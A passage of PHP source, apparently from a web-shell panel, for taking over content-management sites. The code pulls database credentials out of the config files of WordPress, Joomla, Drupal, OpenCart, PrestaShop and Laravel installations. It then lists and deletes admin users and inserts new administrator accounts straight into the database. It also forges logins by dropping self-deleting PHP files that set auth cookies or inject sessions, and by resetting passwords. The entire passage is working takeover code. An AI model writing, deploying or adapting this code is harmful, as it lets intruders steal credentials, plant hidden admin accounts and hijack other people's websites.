                $c=@file_get_contents("$root/sites/default/settings.php"); if(!$c) return null;
                preg_match("/'database'\s*=>\s*'([^']+)'",$c,$m); $db['name']=$m[1]??'';
                preg_match("/'username'\s*=>\s*'([^']+)'",$c,$m); $db['user']=$m[1]??'';
                preg_match("/'password'\s*=>\s*'([^']*)'",$c,$m); $db['pass']=$m[1]??'';
                preg_match("/'host'\s*=>\s*'([^']+)'",$c,$m); $db['host']=$m[1]??'localhost';
                preg_match("/'prefix'\s*=>\s*'([^']*)'",$c,$m); $db['prefix']=$m[1]??'';
            } elseif ($type==='prestashop') {
                $c=@file_get_contents("$root/app/config/parameters.php");
                if(!$c) $c=@file_get_contents("$root/config/settings.inc.php");
                if(!$c) return null;
                // PS 1.7+
                preg_match("/'database_name'\s*=>\s*'([^']+)'",$c,$m); $db['name']=$m[1]??'';
                preg_match("/'database_user'\s*=>\s*'([^']+)'",$c,$m); $db['user']=$m[1]??'';
                preg_match("/'database_password'\s*=>\s*'([^']*)'",$c,$m); $db['pass']=$m[1]??'';
                preg_match("/'database_host'\s*=>\s*'([^']+)'",$c,$m); $db['host']=$m[1]??'localhost';
                preg_match("/'database_prefix'\s*=>\s*'([^']*)'",$c,$m); $db['prefix']=$m[1]??'';
                // PS 1.6 fallback
                if(!$db['name']) { preg_match("/define\s*\(\s*'_DB_NAME_'\s*,\s*'([^']+)'/i",$c,$m); $db['name']=$m[1]??''; }
                if(!$db['user']) { preg_match("/define\s*\(\s*'_DB_USER_'\s*,\s*'([^']+)'/i",$c,$m); $db['user']=$m[1]??''; }
                if(!$db['pass']&&$db['pass']!=='0') { preg_match("/define\s*\(\s*'_DB_PASSWD_'\s*,\s*'([^']*)'/",$c,$m); $db['pass']=$m[1]??''; }
                if($db['host']==='localhost') { preg_match("/define\s*\(\s*'_DB_SERVER_'\s*,\s*'([^']+)'/i",$c,$m); if(isset($m[1])) $db['host']=$m[1]; }
                if(!$db['prefix']) { preg_match("/define\s*\(\s*'_DB_PREFIX_'\s*,\s*'([^']+)'/i",$c,$m); $db['prefix']=$m[1]??'ps_'; }
            } elseif ($type==='laravel') {
                $c=@file_get_contents("$root/.env"); if(!$c) return null;
                $envGet = function($key, $default='') use ($c) {
                    if (preg_match('/^'.preg_quote($key,'/').'=(.*)$/m', $c, $m)) return trim($m[1], "\" \t\r");
                    return $default;
                };
                $db['host']=$envGet('DB_HOST','localhost'); $db['name']=$envGet('DB_DATABASE');
                $db['user']=$envGet('DB_USERNAME'); $db['pass']=$envGet('DB_PASSWORD');
                $db['prefix']=$envGet('DB_PREFIX','');
            }
            return ($db['name']&&$db['user']) ? $db : null;
        };

        // ── Helper: PDO connect ────────────────────────────────────────
        $_dbLastError = '';
        $dbCon = function($db) use (&$_dbLastError) {
            // Try PDO first
            if (extension_loaded('pdo_mysql')) {
                try {
                    return new PDO("mysql:host={$db['host']};dbname={$db['name']};charset=utf8mb4",$db['user'],$db['pass'],[
                        PDO::ATTR_ERRMODE=>PDO::ERRMODE_EXCEPTION,
                        PDO::ATTR_TIMEOUT=>5,
                    ]);
                } catch(\Exception $e){
                    $_dbLastError = $e->getMessage() . " (host={$db['host']}, db={$db['name']}, user={$db['user']})";
                    return null;
                }
            }
            // Fallback: mysqli → wrap in PDO-like object
            if (extension_loaded('mysqli')) {
                try {
                    $port = 3306; $host = $db['host'];
                    if (strpos($host, ':') !== false) { list($host, $port) = explode(':', $host, 2); $port = (int)$port; }
                    $m = @new \mysqli($host, $db['user'], $db['pass'], $db['name'], $port);
                    if ($m->connect_error) {
                        $_dbLastError = "mysqli: {$m->connect_error} (host={$db['host']}, db={$db['name']}, user={$db['user']})";
                        return null;
                    }
                    $m->set_charset('utf8mb4');
                    // Wrap mysqli in a minimal PDO-compatible object
                    return new class($m) {
                        private $m;
                        public function __construct($m) { $this->m = $m; }
                        public function query($sql) {
                            $r = $this->m->query($sql);
                            if ($r === false) throw new \Exception($this->m->error);
                            return new class($r) {
                                private $r;
                                public function __construct($r) { $this->r = $r; }
                                public function fetchAll($mode = 0) { $rows = []; while ($row = $this->r->fetch_assoc()) $rows[] = $row; $this->r->free(); return $rows; }
                                public function fetch($mode = 0) { $row = $this->r->fetch_assoc(); if (!$row) $this->r->free(); return $row ?: false; }
                                public function fetchColumn($col = 0) { $row = $this->r->fetch_array(); $this->r->free(); return $row ? $row[$col] : false; }
                            };
                        }
                        public function prepare($sql) {
                            $m = $this->m; $origSql = $sql;
                            return new class($m, $origSql) {
                                private $m; private $sql; private $params = []; private $result;
                                public function __construct($m, $sql) { $this->m = $m; $this->sql = $sql; }
                                public function bindValue($pos, $val, $type = 0) { $this->params[$pos] = $val; }
                                public function execute($params = null) {
                                    $sql = $this->sql; $p = $params ?: array_values($this->params);
                                    foreach ($p as $v) { $v = is_int($v) ? $v : "'" . $this->m->real_escape_string($v) . "'"; $sql = preg_replace('/\?/', $v, $sql, 1); }
                                    $this->result = $this->m->query($sql);
                                    if ($this->result === false) throw new \Exception($this->m->error);
                                    return true;
                                }
                                public function fetchAll($mode = 0) { if (!$this->result || $this->result === true) return []; $rows=[]; while($row=$this->result->fetch_assoc()) $rows[]=$row; $this->result->free(); return $rows; }
                                public function fetch($mode = 0) { if (!$this->result || $this->result === true) return false; $row=$this->result->fetch_assoc(); if(!$row && $this->result instanceof \mysqli_result) $this->result->free(); return $row ?: false; }
                                public function fetchColumn($col = 0) { if (!$this->result || $this->result === true) return false; $row=$this->result->fetch_array(); if ($this->result instanceof \mysqli_result) $this->result->free(); return $row ? $row[$col] : false; }
                                public function rowCount() { return $this->m->affected_rows; }
                            };
                        }
                        public function lastInsertId() { return (string)$this->m->insert_id; }
                    };
                } catch(\Exception $e) {
                    $_dbLastError = "mysqli: {$e->getMessage()} (host={$db['host']}, db={$db['name']}, user={$db['user']})";
                    return null;
                }
            }
            $_dbLastError = "No MySQL driver (pdo_mysql or mysqli) available";
            return null;
        };

        // ── detect ─────────────────────────────────────────────────────
        if ($cmsAction === 'detect') {
            $r['instances'] = $findCmsInstances();
            $r['count'] = count($r['instances']);

        // ── detect_path (manual path) ─────────────────────────────────
        } elseif ($cmsAction === 'detect_path') {
            $mp = rtrim(trim($_POST['cms_path'] ?? ''), '/\\');
            if (!$mp || !is_dir($mp)) { $r['ok']=false; $r['error']="Directory not found: $mp"; echo json_encode($r); exit; }
            $detected = null;
            if (file_exists("$mp/wp-config.php")) $detected = 'wordpress';
            elseif (file_exists("$mp/configuration.php") && strpos(@file_get_contents("$mp/configuration.php",false,null,0,2000),'JConfig')!==false) $detected = 'joomla';
            elseif (file_exists("$mp/artisan") && file_exists("$mp/.env")) $detected = 'laravel';
            elseif (file_exists("$mp/config.php") && (file_exists("$mp/system/startup.php")||file_exists("$mp/system/engine/action.php"))) $detected = 'opencart';
            elseif (file_exists("$mp/sites/default/settings.php")) $detected = 'drupal';
            elseif (file_exists("$mp/app/config/parameters.php")||file_exists("$mp/config/settings.inc.php")) $detected = 'prestashop';
            // Check parent for Laravel (user might paste public/ path)
            if (!$detected && file_exists("$mp/../artisan") && file_exists("$mp/../.env")) {
                $detected = 'laravel'; $mp = realpath("$mp/..") ?: dirname($mp);
            }
            if ($detected) {
                $r['type'] = $detected; $r['root'] = $mp;
                $db = $parseDb($detected, $mp);
                $r['db_found'] = $db ? true : false;
                if ($db) { $r['db_host'] = $db['host']; $r['db_name'] = $db['name']; }
            } else {
                $r['ok'] = false;
                $r['error'] = 'No CMS detected. Files found: ' . implode(', ', array_slice(array_filter(scandir($mp), function($f){return $f!=='.'&&$f!=='..';}), 0, 15));
            }

        // ── list ───────────────────────────────────────────────────────
        } elseif ($cmsAction === 'list') {
            if (!$cmsRoot||!$cmsType) { $r['ok']=false; $r['error']='cms_root and cms_type required'; echo json_encode($r); exit; }
            $db=$parseDb($cmsType,$cmsRoot);
            if (!$db) { $r['ok']=false; $r['error']="Cannot parse DB config for $cmsType"; echo json_encode($r); exit; }
            $pdo=$dbCon($db);
            if (!$pdo) { $r['ok']=false; $r['error']='DB connection failed: ' . $_dbLastError; echo json_encode($r); exit; }
            $pg=max(1,intval($_POST['page']??1)); $pp=20; $off=($pg-1)*$pp; $p=$db['prefix'];
            $roleFilter=trim($_POST['role']??'administrator');
            $users=[]; $total=0;
            try {
                if ($cmsType==='wordpress') {
                    if ($roleFilter && $roleFilter!=='all') {
                        $likeRole='%"'.$roleFilter.'"%';
                        $cntSt=$pdo->prepare("SELECT COUNT(*) FROM `{$p}users` u INNER JOIN `{$p}usermeta` um ON u.ID=um.user_id AND um.meta_key='{$p}capabilities' WHERE um.meta_value LIKE ?");
                        $cntSt->execute([$likeRole]); $total=(int)$cntSt->fetchColumn();
                        $st=$pdo->prepare("SELECT u.ID,u.user_login,u.user_email,u.user_registered,um.meta_value as caps FROM `{$p}users` u INNER JOIN `{$p}usermeta` um ON u.ID=um.user_id AND um.meta_key='{$p}capabilities' WHERE um.meta_value LIKE ? ORDER BY u.ID DESC LIMIT ?,?");
                        $st->bindValue(1,$likeRole); $st->bindValue(2,$off,PDO::PARAM_INT); $st->bindValue(3,$pp,PDO::PARAM_INT); $st->execute();
                    } else {
                        $total=(int)$pdo->query("SELECT COUNT(*) FROM `{$p}users`")->fetchColumn();
                        $st=$pdo->prepare("SELECT u.ID,u.user_login,u.user_email,u.user_registered,um.meta_value as caps FROM `{$p}users` u LEFT JOIN `{$p}usermeta` um ON u.ID=um.user_id AND um.meta_key='{$p}capabilities' ORDER BY u.ID DESC LIMIT ?,?");
                        $st->bindValue(1,$off,PDO::PARAM_INT); $st->bindValue(2,$pp,PDO::PARAM_INT); $st->execute();
                    }
                    foreach($st->fetchAll(PDO::FETCH_ASSOC) as $u) {
                        $roles=array_keys(@unserialize($u['caps']??'')?:[]);
                        $flags=[]; if((time()-strtotime($u['user_registered']))<30*86400) $flags[]='recent';
                        $users[]=['id'=>(int)$u['ID'],'login'=>$u['user_login'],'email'=>$u['user_email'],'created'=>$u['user_registered'],'roles'=>$roles,'flags'=>$flags];
                    }
                } elseif ($cmsType==='joomla') {
                    $total=(int)$pdo->query("SELECT COUNT(*) FROM `{$p}users`")->fetchColumn();
                    $st=$pdo->prepare("SELECT u.id,u.username,u.email,u.name,u.registerDate,u.block FROM `{$p}users` u ORDER BY u.id DESC LIMIT ?,?");
                    $st->bindValue(1,$off,PDO::PARAM_INT); $st->bindValue(2,$pp,PDO::PARAM_INT); $st->execute();
                    $sgId=8; try { $sg=$pdo->query("SELECT id FROM `{$p}usergroups` WHERE title='Super Users' LIMIT 1")->fetch(PDO::FETCH_ASSOC); if($sg) $sgId=$sg['id']; } catch(\Exception $e){}
                    foreach($st->fetchAll(PDO::FETCH_ASSOC) as $u) {
                        $gs=$pdo->prepare("SELECT g.title FROM `{$p}usergroups` g INNER JOIN `{$p}user_usergroup_map` m ON g.id=m.group_id WHERE m.user_id=?");
                        $gs->execute([$u['id']]); $groups=array_column($gs->fetchAll(PDO::FETCH_ASSOC),'title');
                        $flags=[]; if($u['block']) $flags[]='blocked'; if(in_array('Super Users',$groups)) $flags[]='superadmin';
                        if((time()-strtotime($u['registerDate']))<30*86400) $flags[]='recent';
                        $users[]=['id'=>(int)$u['id'],'login'=>$u['username'],'email'=>$u['email'],'display_name'=>$u['name'],'created'=>$u['registerDate'],'roles'=>$groups,'flags'=>$flags];
                    }
                } elseif ($cmsType==='opencart') {
                    $total=(int)$pdo->query("SELECT COUNT(*) FROM `{$p}user`")->fetchColumn();
                    $st=$pdo->prepare("SELECT u.user_id,u.username,u.email,u.firstname,u.lastname,u.date_added,u.status,g.name as grp FROM `{$p}user` u LEFT JOIN `{$p}user_group` g ON u.user_group_id=g.user_group_id ORDER BY u.user_id DESC LIMIT ?,?");
                    $st->bindValue(1,$off,PDO::PARAM_INT); $st->bindValue(2,$pp,PDO::PARAM_INT); $st->execute();
                    foreach($st->fetchAll(PDO::FETCH_ASSOC) as $u) {
                        $flags=[]; if(!$u['status']) $flags[]='disabled'; if((time()-strtotime($u['date_added']))<30*86400) $flags[]='recent';
                        $users[]=['id'=>(int)$u['user_id'],'login'=>$u['username'],'email'=>$u['email'],'display_name'=>trim($u['firstname'].' '.$u['lastname']),'created'=>$u['date_added'],'roles'=>[$u['grp']?:'Admin'],'flags'=>$flags];
                    }
                } elseif ($cmsType==='drupal') {
                    $hasFd=false; try{$pdo->query("SELECT 1 FROM `{$p}users_field_data` LIMIT 1");$hasFd=true;}catch(\Exception $e){}
                    if ($hasFd) {
                        $total=(int)$pdo->query("SELECT COUNT(*) FROM `{$p}users_field_data` WHERE uid>0")->fetchColumn();
                        $st=$pdo->prepare("SELECT uid,name,mail,created,status FROM `{$p}users_field_data` WHERE uid>0 ORDER BY uid DESC LIMIT ?,?");
                    } else {
                        $total=(int)$pdo->query("SELECT COUNT(*) FROM `{$p}users` WHERE uid>0")->fetchColumn();
                        $st=$pdo->prepare("SELECT uid,name,mail,created,status FROM `{$p}users` WHERE uid>0 ORDER BY uid DESC LIMIT ?,?");
                    }
                    $st->bindValue(1,$off,PDO::PARAM_INT); $st->bindValue(2,$pp,PDO::PARAM_INT); $st->execute();
                    foreach($st->fetchAll(PDO::FETCH_ASSOC) as $u) {
                        $roles=[]; try{$rs=$pdo->prepare("SELECT roles_target_id FROM `{$p}user__roles` WHERE entity_id=?");$rs->execute([$u['uid']]);$roles=array_column($rs->fetchAll(PDO::FETCH_ASSOC),'roles_target_id');}catch(\Exception $e){try{$rs=$pdo->prepare("SELECT rid FROM `{$p}users_roles` WHERE uid=?");$rs->execute([$u['uid']]);$roles=array_column($rs->fetchAll(PDO::FETCH_ASSOC),'rid');}catch(\Exception $e2){}}
                        $flags=[]; if(!$u['status']) $flags[]='blocked';
                        $createdStr=is_numeric($u['created'])?date('Y-m-d H:i:s',(int)$u['created']):$u['created'];
                        if((time()-(is_numeric($u['created'])?(int)$u['created']:strtotime($u['created'])))<30*86400) $flags[]='recent';
                        $users[]=['id'=>(int)$u['uid'],'login'=>$u['name'],'email'=>$u['mail'],'created'=>$createdStr,'roles'=>$roles?:['authenticated'],'flags'=>$flags];
                    }
                } elseif ($cmsType==='prestashop') {
                    $total=(int)$pdo->query("SELECT COUNT(*) FROM `{$p}employee`")->fetchColumn();
                    $st=$pdo->prepare("SELECT e.id_employee,e.email,e.firstname,e.lastname,e.date_add,e.active,p.name as pname FROM `{$p}employee` e LEFT JOIN `{$p}profile_lang` p ON e.id_profile=p.id_profile AND p.id_lang=1 ORDER BY e.id_employee DESC LIMIT ?,?");
                    $st->bindValue(1,$off,PDO::PARAM_INT); $st->bindValue(2,$pp,PDO::PARAM_INT); $st->execute();
                    foreach($st->fetchAll(PDO::FETCH_ASSOC) as $u) {
                        $flags=[]; if(!$u['active']) $flags[]='disabled'; if((time()-strtotime($u['date_add']))<30*86400) $flags[]='recent';
                        $users[]=['id'=>(int)$u['id_employee'],'login'=>$u['email'],'email'=>$u['email'],'display_name'=>trim($u['firstname'].' '.$u['lastname']),'created'=>$u['date_add'],'roles'=>[$u['pname']?:'Administrator'],'flags'=>$flags];
                    }
                } elseif ($cmsType==='laravel') {
                    $tbl="{$p}users";
                    $total=(int)$pdo->query("SELECT COUNT(*) FROM `$tbl`")->fetchColumn();
                    $cols=[]; try{$colSt=$pdo->query("SHOW COLUMNS FROM `$tbl`");foreach($colSt->fetchAll(PDO::FETCH_ASSOC) as $col)$cols[]=$col['Field'];}catch(\Exception $e){}
                    $hasRole=in_array('role',$cols); $hasIsAdmin=in_array('is_admin',$cols);
                    $nameCol=in_array('name',$cols)?'name':'username'; $emailCol=in_array('email',$cols)?'email':'mail';
                    $dateCol=in_array('created_at',$cols)?'created_at':'created';
                    $st=$pdo->prepare("SELECT * FROM `$tbl` ORDER BY id DESC LIMIT ?,?");
                    $st->bindValue(1,$off,PDO::PARAM_INT); $st->bindValue(2,$pp,PDO::PARAM_INT); $st->execute();
                    foreach($st->fetchAll(PDO::FETCH_ASSOC) as $u) {
                        $roles=[]; if($hasRole && !empty($u['role'])) $roles=[$u['role']]; elseif($hasIsAdmin && $u['is_admin']) $roles=['admin']; else $roles=['user'];
                        $flags=[]; $created=$u[$dateCol]??'';
                        if($created && (time()-strtotime($created))<30*86400) $flags[]='recent';
                        $users[]=['id'=>(int)$u['id'],'login'=>$u[$nameCol]??'','email'=>$u[$emailCol]??'','created'=>$created,'roles'=>$roles,'flags'=>$flags];
                    }
                    // Try roles from separate table (Spatie/Bouncer)
                    if(!$hasRole && !$hasIsAdmin) {
                        try {
                            $roleTbl="{$p}model_has_roles"; $roleNames="{$p}roles";
                            $roleMap=[];
                            $rs=$pdo->query("SELECT mhr.model_id,r.name FROM `$roleTbl` mhr JOIN `$roleNames` r ON mhr.role_id=r.id WHERE mhr.model_type LIKE '%User%'");
                            foreach($rs->fetchAll(PDO::FETCH_ASSOC) as $rw) { $roleMap[(int)$rw['model_id']][]=$rw['name']; }
                            foreach($users as &$uu) { if(isset($roleMap[$uu['id']])) $uu['roles']=$roleMap[$uu['id']]; } unset($uu);
                        } catch(\Exception $e) {}
                    }
                } else { $r['ok']=false; $r['error']="Unsupported CMS: $cmsType"; echo json_encode($r); exit; }
                $r['users']=$users; $r['total']=$total; $r['page']=$pg; $r['per_page']=$pp;
                $r['total_pages']=max(1,(int)ceil($total/$pp)); $r['cms_type']=$cmsType;
            } catch(\Exception $e){ $r['ok']=false; $r['error']=$e->getMessage(); }

        // ── delete ─────────────────────────────────────────────────────
        } elseif ($cmsAction === 'delete') {
            $uids=array_values(array_filter(array_map('intval',json_decode($_POST['user_ids']??'[]',true)?:[]),function($id){return $id>1;}));
            if (!$cmsRoot||!$cmsType||empty($uids)){$r['ok']=false;$r['error']='cms_root, cms_type, user_ids required';echo json_encode($r);exit;}
            $db=$parseDb($cmsType,$cmsRoot); $pdo=$db?$dbCon($db):null;
            if(!$pdo){$r['ok']=false;$r['error']='DB connection failed';echo json_encode($r);exit;}
            $p=$db['prefix']; $pl=implode(',',array_fill(0,count($uids),'?')); $deleted=0;
            try {
                if ($cmsType==='wordpress') {
                    $pdo->prepare("DELETE FROM `{$p}usermeta` WHERE user_id IN ($pl)")->execute($uids);
                    $st=$pdo->prepare("DELETE FROM `{$p}users` WHERE ID IN ($pl) AND ID>1"); $st->execute($uids); $deleted=$st->rowCount();
                } elseif ($cmsType==='joomla') {
                    $pdo->prepare("DELETE FROM `{$p}user_usergroup_map` WHERE user_id IN ($pl)")->execute($uids);
                    $st=$pdo->prepare("DELETE FROM `{$p}users` WHERE id IN ($pl) AND id>1"); $st->execute($uids); $deleted=$st->rowCount();
                } elseif ($cmsType==='opencart') {
                    $st=$pdo->prepare("DELETE FROM `{$p}user` WHERE user_id IN ($pl)"); $st->execute($uids); $deleted=$st->rowCount();
                } elseif ($cmsType==='drupal') {
                    try{$pdo->prepare("DELETE FROM `{$p}user__roles` WHERE entity_id IN ($pl)")->execute($uids);}catch(\Exception $e){}
                    try{$pdo->prepare("DELETE FROM `{$p}users_field_data` WHERE uid IN ($pl) AND uid>1")->execute($uids);}catch(\Exception $e){}
                    $st=$pdo->prepare("DELETE FROM `{$p}users` WHERE uid IN ($pl) AND uid>1"); $st->execute($uids); $deleted=$st->rowCount();
                } elseif ($cmsType==='prestashop') {
                    $st=$pdo->prepare("DELETE FROM `{$p}employee` WHERE id_employee IN ($pl) AND id_employee>1"); $st->execute($uids); $deleted=$st->rowCount();
                } elseif ($cmsType==='laravel') {
                    try{$pdo->prepare("DELETE FROM `{$p}model_has_roles` WHERE model_id IN ($pl)")->execute($uids);}catch(\Exception $e){}
                    $st=$pdo->prepare("DELETE FROM `{$p}users` WHERE id IN ($pl) AND id>1"); $st->execute($uids); $deleted=$st->rowCount();
                }
                $r['deleted']=$deleted;
            } catch(\Exception $e){ $r['ok']=false; $r['error']=$e->getMessage(); }

        // ── add ────────────────────────────────────────────────────────
        } elseif ($cmsAction === 'add') {
            $uname=trim($_POST['username']??''); $email=trim($_POST['email']??''); $pass=$_POST['password']??'';
            if(!$cmsRoot||!$cmsType||!$uname||!$email||!$pass){$r['ok']=false;$r['error']='All fields required';echo json_encode($r);exit;}
            $db=$parseDb($cmsType,$cmsRoot); $pdo=$db?$dbCon($db):null;
            if(!$pdo){$r['ok']=false;$r['error']='DB connection failed';echo json_encode($r);exit;}
            $p=$db['prefix'];
            try {
                if ($cmsType==='wordpress') {
                    $hash=''; if(file_exists("$cmsRoot/wp-includes/class-phpass.php")){@include_once "$cmsRoot/wp-includes/class-phpass.php";if(class_exists('PasswordHash')){$h=new PasswordHash(8,true);$hash=$h->HashPassword($pass);}}
                    if(!$hash) $hash=password_hash($pass,PASSWORD_BCRYPT);
                    $st=$pdo->prepare("INSERT INTO `{$p}users` (user_login,user_pass,user_email,user_registered,user_status,display_name) VALUES (?,?,?,NOW(),0,?)");
                    $st->execute([$uname,$hash,$email,$uname]); $uid=(int)$pdo->lastInsertId();
                    $pdo->prepare("INSERT INTO `{$p}usermeta` (user_id,meta_key,meta_value) VALUES (?,?,?)")->execute([$uid,"{$p}capabilities",'a:1:{s:13:"administrator";b:1;}']);
                    $pdo->prepare("INSERT INTO `{$p}usermeta` (user_id,meta_key,meta_value) VALUES (?,?,?)")->execute([$uid,"{$p}user_level",'10']);
                    $r['user_id']=$uid; $r['login']=$uname;
                } elseif ($cmsType==='joomla') {
                    $salt=md5(rand()); $crypted=md5($pass.$salt).':'.$salt;
                    $st=$pdo->prepare("INSERT INTO `{$p}users` (name,username,email,password,usertype,registerDate,params,requireReset) VALUES (?,?,?,?,'',NOW(),'',0)");
                    $st->execute([$uname,$uname,$email,$crypted]); $uid=(int)$pdo->lastInsertId();
                    $sgId=8; try{$sg=$pdo->query("SELECT id FROM `{$p}usergroups` WHERE title='Super Users' LIMIT 1")->fetch(PDO::FETCH_ASSOC);if($sg)$sgId=$sg['id'];}catch(\Exception $e){}
                    $pdo->prepare("INSERT INTO `{$p}user_usergroup_map` (user_id,group_id) VALUES (?,?)")->execute([$uid,$sgId]);
                    $r['user_id']=$uid; $r['login']=$uname;
                } elseif ($cmsType==='opencart') {
                    $salt=substr(md5(rand()),0,9); $hash=sha1($salt.sha1($salt.sha1($pass)));
                    $st=$pdo->prepare("INSERT INTO `{$p}user` (user_group_id,username,password,salt,email,status,date_added) VALUES (1,?,?,?,?,1,NOW())");
                    $st->execute([$uname,$hash,$salt,$email]); $r['user_id']=(int)$pdo->lastInsertId(); $r['login']=$uname;
                } elseif ($cmsType==='drupal') {
                    $hash=password_hash($pass,PASSWORD_BCRYPT); $now=time();
                    $maxUid=(int)$pdo->query("SELECT COALESCE(MAX(uid),0)+1 FROM `{$p}users`")->fetchColumn();
                    $pdo->prepare("INSERT IGNORE INTO `{$p}users` (uid,uuid,langcode) VALUES (?,?,?)")->execute([$maxUid,bin2hex(random_bytes(16)),'en']);
                    try{$pdo->prepare("INSERT INTO `{$p}users_field_data` (uid,name,mail,pass,status,created,changed,langcode,default_langcode) VALUES (?,?,?,?,1,?,?,?,1)")->execute([$maxUid,$uname,$email,$hash,$now,$now,'en']);}catch(\Exception $e){}
                    try{$pdo->prepare("INSERT INTO `{$p}user__roles` (bundle,deleted,entity_id,revision_id,langcode,delta,roles_target_id) VALUES ('user',0,?,?,?,0,'administrator')")->execute([$maxUid,$maxUid,'en']);}catch(\Exception $e){}
                    $r['user_id']=$maxUid; $r['login']=$uname;
                } elseif ($cmsType==='prestashop') {
                    $hash=password_hash($pass,PASSWORD_BCRYPT);
                    $st=$pdo->prepare("INSERT INTO `{$p}employee` (id_profile,email,passwd,lastname,firstname,active,bo_color,bo_theme,bo_css,id_last_order,id_last_customer_message,id_last_customer) VALUES (1,?,?,?,?,1,'','theme_default','admin.css',0,0,0)");
                    $st->execute([$email,$hash,$uname,$uname]); $r['user_id']=(int)$pdo->lastInsertId(); $r['login']=$email;
                } elseif ($cmsType==='laravel') {
                    $hash=password_hash($pass,PASSWORD_BCRYPT);
                    $cols=[]; try{$colSt=$pdo->query("SHOW COLUMNS FROM `{$p}users`");foreach($colSt->fetchAll(PDO::FETCH_ASSOC) as $col)$cols[]=$col['Field'];}catch(\Exception $e){}
                    $nameCol=in_array('name',$cols)?'name':'username';
                    $st=$pdo->prepare("INSERT INTO `{$p}users` (`$nameCol`,email,password,created_at,updated_at) VALUES (?,?,?,NOW(),NOW())");
                    $st->execute([$uname,$email,$hash]); $uid=(int)$pdo->lastInsertId();
                    try{$adminRole=$pdo->query("SELECT id FROM `{$p}roles` WHERE name IN ('admin','super-admin','administrator') LIMIT 1")->fetchColumn();
                        if($adminRole) $pdo->prepare("INSERT INTO `{$p}model_has_roles` (role_id,model_type,model_id) VALUES (?,'App\\\\Models\\\\User',?)")->execute([$adminRole,$uid]);
                    }catch(\Exception $e){}
                    $r['user_id']=$uid; $r['login']=$uname;
                } else { $r['ok']=false; $r['error']="Unsupported CMS: $cmsType"; echo json_encode($r); exit; }
            } catch(\Exception $e){ $r['ok']=false; $r['error']=$e->getMessage(); }

        // ── autologin ──────────────────────────────────────────────────
        } elseif ($cmsAction === 'autologin') {
            $uid=intval($_POST['user_id']??0);
            if(!$cmsRoot||!$cmsType||!$uid){$r['ok']=false;$r['error']='cms_root, cms_type, user_id required';echo json_encode($r);exit;}
            $token=bin2hex(random_bytes(16)); $tmpFile="$cmsRoot/tmp_shl_{$token}.php"; $expiry=time()+120;
            $db=$parseDb($cmsType,$cmsRoot); $pdo=$db?$dbCon($db):null;
            $scheme=(!empty($_SERVER['HTTPS'])&&$_SERVER['HTTPS']!=='off')?'https':'http';
            $host=$_SERVER['HTTP_HOST']??$_SERVER['SERVER_NAME']??'localhost';
            $siteUrl="$scheme://$host";
            if ($cmsType==='wordpress') {
                if($pdo){try{$su=$pdo->query("SELECT option_value FROM `{$db['prefix']}options` WHERE option_name='siteurl' LIMIT 1")->fetchColumn();if($su)$siteUrl=rtrim($su,'/');}catch(\Exception $e){}}
                $er=addslashes($cmsRoot);
                $phpCode="<?php\n@error_reporting(0);\nif(time()>{$expiry}){@unlink(__FILE__);die('expired');}\ndefine('SHORTINIT',false);\nrequire_once('{$er}/wp-load.php');\nwp_set_auth_cookie({$uid},true);\nwp_set_current_user({$uid});\n@unlink(__FILE__);\nwp_redirect(admin_url());\nexit;\n";
                if(@file_put_contents($tmpFile,$phpCode)!==false){@chmod($tmpFile,0644);$r['url']="$siteUrl/tmp_shl_{$token}.php";$r['type']='link';$r['expires']=120;}
                else{$r['ok']=false;$r['error']='Cannot write temp file';}
            } elseif ($cmsType==='joomla') {
                $jCfg=@file_get_contents("$cmsRoot/configuration.php");
                if($jCfg){preg_match('/public\s+\$live_site\s*=\s*\'([^\']+)\'/i',$jCfg,$m);if(!empty($m[1]))$siteUrl=rtrim($m[1],'/');}
                $er=addslashes($cmsRoot);
                $phpCode="<?php\n@error_reporting(0);\nif(time()>{$expiry}){@unlink(__FILE__);die('expired');}\ndefine('_JEXEC',1);\ndefine('JPATH_BASE','{$er}/administrator');\nif(!file_exists(JPATH_BASE.'/includes/defines.php')){@unlink(__FILE__);die('Joomla path error');}\nrequire_once(JPATH_BASE.'/includes/defines.php');\nrequire_once(JPATH_BASE.'/includes/framework.php');\ntry{\n\$app=JFactory::getApplication('administrator');\n\$sess=JFactory::getSession();\n\$user=JFactory::getUser({$uid});\n\$sess->set('user',\$user);\n\$sess->set('userid',{$uid});\n@unlink(__FILE__);\nheader('Location:{$siteUrl}/administrator/index.php');\n}catch(\\Exception \$e){\n@unlink(__FILE__);\nheader('Location:{$siteUrl}/administrator/index.php');\n}\nexit;\n";
                if(@file_put_contents($tmpFile,$phpCode)!==false){@chmod($tmpFile,0644);$r['url']="$siteUrl/tmp_shl_{$token}.php";$r['type']='link';$r['expires']=120;$r['note']='Joomla 3.x session injection';}
                else{$r['ok']=false;$r['error']='Cannot write temp file';}
            } elseif ($cmsType==='opencart') {
                $ocCfg=@file_get_contents("$cmsRoot/config.php");
                $adminUrl="$siteUrl/admin/";
                if($ocCfg&&preg_match("/define\s*\(\s*'HTTP_SERVER'\s*,\s*'([^']+)'/i",$ocCfg,$m)) $adminUrl=rtrim($m[1],'/').'/admin/';
                $st=bin2hex(random_bytes(16));
                $phpCode="<?php\n@error_reporting(0);\nif(time()>{$expiry}){@unlink(__FILE__);die('expired');}\nsession_start();\n\$_SESSION['user_id']={$uid};\n\$_SESSION['user_token']='{$st}';\n\$_SESSION['token']='{$st}';\n@unlink(__FILE__);\nheader('Location:{$adminUrl}index.php?route=common/dashboard&user_token={$st}');\nexit;\n";
                if(@file_put_contents($tmpFile,$phpCode)!==false){@chmod($tmpFile,0644);$r['url']="$siteUrl/tmp_shl_{$token}.php";$r['type']='link';$r['expires']=120;$r['note']='OC2/OC3 session injection';}
                else{$r['ok']=false;$r['error']='Cannot write temp file';}
            } elseif ($cmsType==='drupal') {
                if($pdo&&$db){
                    $tempPass='Shield_'.bin2hex(random_bytes(5));
                    $hash=password_hash($tempPass,PASSWORD_BCRYPT); $pp2=$db['prefix'];
                    try{
                        try{$pdo->prepare("UPDATE `{$pp2}users_field_data` SET pass=? WHERE uid=?")->execute([$hash,$uid]);}catch(\Exception $e){}
                        try{$pdo->prepare("UPDATE `{$pp2}users` SET pass=? WHERE uid=?")->execute([$hash,$uid]);}catch(\Exception $e){}
                        $r['login_url']="$siteUrl/user/login"; $r['temp_password']=$tempPass;
                        $r['type']='password'; $r['note']='Temp password — change after login';
                    }catch(\Exception $e){$r['ok']=false;$r['error']=$e->getMessage();}
                } else {$r['ok']=false;$r['error']='DB required for Drupal auto-login';}
            } elseif ($cmsType==='prestashop') {
                if($pdo&&$db){
                    $tempPass='Shield'.strtoupper(bin2hex(random_bytes(4)));
